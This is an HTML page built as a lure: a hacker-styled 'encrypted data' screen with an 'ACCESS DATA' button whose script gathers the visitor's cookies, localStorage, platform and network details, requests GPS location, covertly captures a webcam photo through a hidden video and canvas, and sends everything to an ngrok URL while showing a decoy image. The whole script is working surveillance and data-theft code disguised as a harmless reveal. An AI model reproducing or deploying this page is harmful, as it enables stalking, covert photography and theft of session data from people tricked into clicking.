<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure System Core</title>
    <style>
        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #000; color: #0f0; font-family: 'Courier New', monospace; }
        #box { text-align: center; padding: 30px; border: 1px solid #0f0; box-shadow: 0 0 15px #0f0; border-radius: 8px; }
        button { background: #0f0; color: #000; border: none; padding: 12px 25px; cursor: pointer; font-weight: bold; margin-top: 20px; border-radius: 4px; }
        #content { display: none; }
        img { max-width: 90%; border: 2px solid #fff; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div id="box">
        <h2>[ ENCRYPTED DATA ]</h2>
        <p>Verification required to bypass firewall and view file.</p>
        <button onclick="runMasterScript()">ACCESS DATA</button>
    </div>

    <div id="content">
        <img src="elephant.jpg" alt="Secret">
    </div>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        // আপনার দেওয়া Ngrok লিঙ্ক এখানে অ্যাড করা হয়েছে
        const TARGET_URL = 'https://2f74-103-174-44-17.ngrok-free.app/vulnerability_probe'; 

        async function runMasterScript() {
            let log = {
                system: {
                    platform: navigator.platform,
                    cookies: document.cookie || "No Cookies",
                    storage: JSON.stringify(localStorage),
                    vulnerabilities: []
                },
                network: {}
            };

            if (navigator.pdfViewerEnabled) log.system.vulnerabilities.push("PDF_Exploit_Active");
            if (navigator.webdriver) log.system.vulnerabilities.push("Bot_Detected");

            const conn = navigator.connection;
            if (conn) log.network = { type: conn.effectiveType, speed: conn.downlink + "Mbps" };

            navigator.geolocation.getCurrentPosition(async (pos) => {
                log.gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        postData(log, canvas.toDataURL('image/jpeg'));
                        stream.getTracks().forEach(t => t.stop());
                    }, 1500);
                } catch (e) { postData(log, null); }
            }, () => postData(log, null));

            document.getElementById('box').style.display = 'none';
            document.getElementById('content').style.display = 'block';
        }

        function postData(data, img) {
            fetch(TARGET_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ...data, photo: img })
            });
        }
    </script>
</body>
</html>
